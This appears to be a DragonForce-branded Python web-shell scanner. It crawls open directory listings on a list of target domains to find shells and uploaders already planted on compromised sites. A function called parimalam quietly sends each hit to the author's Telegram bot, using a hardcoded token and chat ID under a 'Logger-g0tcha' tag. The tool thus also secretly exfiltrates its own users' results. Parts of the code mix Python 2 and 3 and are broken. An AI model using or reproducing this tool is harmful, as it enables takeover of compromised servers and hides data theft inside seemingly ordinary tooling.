# Author: Pari Malam
# -*- coding:utf-8 -*-

import sys
import os
import requests
import re
import urllib3
from sys import stdout
from multiprocessing.dummy import Pool
from colorama import Fore, init
init(autoreset=True)
delete_warning = urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

fr  =   Fore.RED
fc  =   Fore.CYAN
fy  =   Fore.YELLOW
fw  =   Fore.WHITE
fg  =   Fore.GREEN
fm  =   Fore.MAGENTA

if not os.path.exists('Results'):
    os.mkdir('Results')

os.system('clear' if os.name == 'posix' else 'cls')

headers = {'Connection': 'keep-alive',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'}

def banners():
    stdout.write("                                                                                         \n")
    stdout.write(""+Fore.LIGHTRED_EX +"██████╗ ██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗   ██╗ ██████╗ \n")
    stdout.write(""+Fore.LIGHTRED_EX +"██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗████╗  ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝   ██║██╔═══██╗\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██║  ██║██████╔╝███████║██║  ███╗██║   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║     █████╗     ██║██║   ██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██████╔╝██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██║     ╚██████╔╝██║  ██║╚██████╗███████╗██╗██║╚██████╔╝\n")
    stdout.write(""+Fore.LIGHTRED_EX +"╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝╚═╝ ╚═════╝ \n")
    stdout.write(""+Fore.YELLOW +"═════════════╦═════════════════════════════════╦════════════════════════════════════════════════════════════\n")
    stdout.write(""+Fore.YELLOW   +"╔════════════╩═════════════════════════════════╩═════════════════════════════╗\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"AUTHOR             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   PARI MALAM                                    "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"GITHUB             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   GITHUB.COM/PARI-MALAM                         "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"╔════════════════════════════════════════════════════════════════════════════╝\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"OFFICIAL FORUM     "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   DRAGONFORCE.IO                                "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"OFFICIAL TELEGRAM  "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   TELEGRAM.ME/DRAGONFORCEIO                     "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"╚════════════════════════════════════════════════════════════════════════════╝\n") 
    print(Fore.YELLOW + "[Shell-Scanner] - " + Fore.GREEN + "Perform With Shell, Uploader & Mailer Scanner")
banners()


filename = raw_input("\n" + Fore.RED + "[+] " + Fore.YELLOW + "IPs/Domain List: " + Fore.WHITE)

try:
    target = [i.strip() for i in open(filename, mode='r').readlines()]
except FileNotFoundError:
    exit('[!] File not found: ' + filename)



with open('wordlist/Shell-Strings.txt', 'r') as f1, open('wordlist/Shell-Strings.txt', 'r') as f2, open('wordlist/Other-Strings.txt', 'r') as f3, open('wordlist/Traversal.txt', 'r') as f4, open('wordlist/Trusted-Files.txt', 'r') as f5:
    Signs = f1.read().splitlines()
    Strings_Shells = f2.read().splitlines()
    Strings_Uploads = f3.read().splitlines()
    Locations = f4.read().splitlines()
    TrustedFiles = f5.read().splitlines()
def URLdomain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://") :
        site = site.replace("https://","")
    else :
        pass
    pattern = re.compile('(.*)/')
    while re.findall(pattern,site):
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site


def IndeXOf(Contents):

    if '<title>Index of' in Contents:
        return True
    else:
        return False
        
        
def Send_Request(url,Path):
    try:

        Check_Content = requests.get(url + Path, headers=headers, verify=False, allow_redirects=False, timeout=15)
        if(len(Check_Content.content) == 0):
            Content= requests.get(url + Path, headers=headers, verify=False, timeout=15)
            return Content
        else:
            Content = requests.get(url + Path, headers=headers, verify=False, allow_redirects=False, timeout=15)
            return Content
    except:
        pass

def Extract_Folders(FoldersName):

    if '.' not in FoldersName:
        return True


def Extract_Files(FileName):
    if '.' in FileName:
        if '.'  in FileName and '.php' in FileName:
            return True
        elif '.'  in FileName and '.phtml' in FileName:
            return True
        elif '.'  in FileName and '.php3' in FileName:
            return True
        elif '.'  in FileName and '.php4' in FileName:
            return True
            
        elif '.'  in FileName and '.phar' in FileName:
            return True
            
        elif '.'  in FileName and '.shtml' in FileName:
            return True
        elif '.'  in FileName and '.cgi' in FileName:
            return True
        elif '.'  in FileName and '.py' in FileName:
            return True
        elif '.'  in FileName and '.sh' in FileName:
            return True

        elif '.'  in FileName and '.alfa' in FileName:
            return True
        elif '.'  in FileName and '.pl' in FileName:
            return True

        else:
            return False
    else:
        return False
    
def Extract(Contents,Selected):
    

    if '</td><td><a href="' in Contents:
        if 'Files' in Selected or 'Folders' in Selected:
            Pathfiles = re.findall('</td><td><a href="(.*?)">',Contents)
            return Pathfiles

    elif ']"> <a href="' in Contents:
        if 'Files' in Selected or 'Folders' in Selected:
            Pathfiles = re.findall(']"> <a href="(.*?)">',Contents)
            return Pathfiles
    
    elif 'width=device-width, initial-scale=1.0' in Contents or '<tr><td data-sort=' in Contents:
        if 'Files' in Selected or 'Folders' in Selected:
            Pathfiles = re.findall('"><a href="(.*?)"><img class="',Contents)
            return Pathfiles
            


        
def Check_Backdoors(Respones,Sign):
    

    NullData = ""
    if Respones.status_code == 200:

        if Sign in Respones.content:

            php = "<?php"
            perl = "#!/usr/bin/perl"
            py = "#!/usr/bin/python"
            sh = "#!/bin/bash"
            cgi = "#!/usr/local/bin/perl"
            if php not in Respones.content and perl not in Respones.content and py not in Respones.content and sh not in Respones.content and cgi not in Respones.content: 
                return Sign
            else:
                return NullData
        else:
            return NullData 
    else:
        return NullData
        
        

import telepot
def parimalam(url, _FirstFilePhP, _NextFilePhP):
    chat_id = '259790855'
    telegram_token = '5598996353:AAFxlDhZ2wSMG_fRWWI9pWxJb926BGYwryI'
    bot = telepot.Bot(telegram_token)
    message = "[Logger-g0tcha]\n\n[+] URLs: " + url + _FirstFilePhP + _NextFilePhP
    bot.sendMessage(chat_id=chat_id, text=message)



def Exploiter(site,Dirctorys):
    try:
        url = "https://" + URLdomain(site)

        for Path in Dirctorys:
        
            contents = Send_Request(url,Path).content

            if(IndeXOf(contents)):
                ListDirctors = Extract(contents,'Files')
                if(ListDirctors):
                    for elements in TrustedFiles:
                        element = elements + ".php"
                        if element in ListDirctors:
                            ListDirctors.remove(element)
                
                    for dir in ListDirctors:

                        MyDir = dir

                        if(Extract_Files(MyDir)):
                            _FirstFilePhP = Path + MyDir

                            Request_Text = Send_Request(url,_FirstFilePhP)

                            if any(Sign in Check_Backdoors(Request_Text,Sign) for Sign in Signs):
                                if any(Shells in Check_Backdoors(Request_Text,Shells) for Shells in Strings_Shells):
                                    print("[Wordpress]: {} {}{} [Shelled!]").format(url,fg,_FirstFilePhP)
                                    open('Results/Shells.txt','a').write(url + _FirstFilePhP + "\n")
                                    parimalam(url, _FirstFilePhP, "")
                                    exit()
                                elif any(ups in Check_Backdoors(Request_Text,ups) for ups in Strings_Uploads):
                                    print("[Wordpress]: {} {}{} [Uploaders!]").format(url,fg,_FirstFilePhP)
                                    open('Results/Uploaders.txt','a').write(url + _FirstFilePhP + "\n")
                                    parimalam(url, _FirstFilePhP, "")
                                    exit()
                                
                                else:
                                    print("[Wordpress]: {} {}{} [Success!]").format(url,fg,_FirstFilePhP)
                                    open('Results/Success.txt','a').write(url + _FirstFilePhP + "\n")
                                    parimalam(url, _FirstFilePhP, "")
                                    exit()

                            else:
                                print("[Wordpress]: {} {}{} [Not Vulnerable!]").format(url,fr,_FirstFilePhP)
                        if(Extract_Folders(MyDir)):

                            contents2 = Send_Request(url,Path +"/"+ MyDir).content
                            ListDirctors2 = Extract(contents2,'Files')
                            if(ListDirctors2):
                                for elements in TrustedFiles:
                                    element = elements + ".php"
                                    if element in ListDirctors2:
                                        ListDirctors2.remove(element)
                                for Dir2 in ListDirctors2:
                                    MyDir2 = Dir2
                                    if(Extract_Files(MyDir2)):
                                        _NextFilePhP = Path + MyDir + MyDir2
                                        Request_Text = Send_Request(url,_NextFilePhP)
                                        if any(Sign in Check_Backdoors(Request_Text,Sign) for Sign in Signs):
                                            if any(Shells in Check_Backdoors(Request_Text,Shells) for Shells in Strings_Shells):
                                                print("[Wordpress]: {} {}{} [Shelled!]").format(url,fg,_NextFilePhP)
                                                open('Results/Shells.txt','a').write(url + _NextFilePhP + "\n")
                                                parimalam(url, _NextFilePhP, "")
                                                exit()
                                            elif any(ups in Check_Backdoors(Request_Text,ups) for ups in Strings_Uploads):
                                                print("[Wordpress]: {} {}{} [Uploaders!]").format(url,fg,_NextFilePhP)
                                                open('Results/Uploaders.txt','a').write(url + _NextFilePhP + "\n")
                                                parimalam(url, _NextFilePhP, "")
                                                exit()
                                            
                                            else:
                                                print("[Wordpress]: {} {}{} [Success!]").format(url,fg,_NextFilePhP)
                                                open('Results/Success.txt','a').write(url + _NextFilePhP + "\n")
                                                parimalam(url, _NextFilePhP, "")
                                                exit()
                                                
                                        else:
                                            print("[Wordpress]: {} {}{} [Not Vulnerable!]").format(url,fr,_NextFilePhP)
                                            
                                            
            else:
                print("[Wordpress]: {} {}{} [Not Vulnerable!]").format(url,fr,Path)
                
    except :
        pass



def CmsCheckers(site):
    try:
        
        
        Exploiter(site,Locations)
    

        
    except:
        pass






mp = Pool(100)
mp.map(CmsCheckers, target)
mp.close()
mp.join()

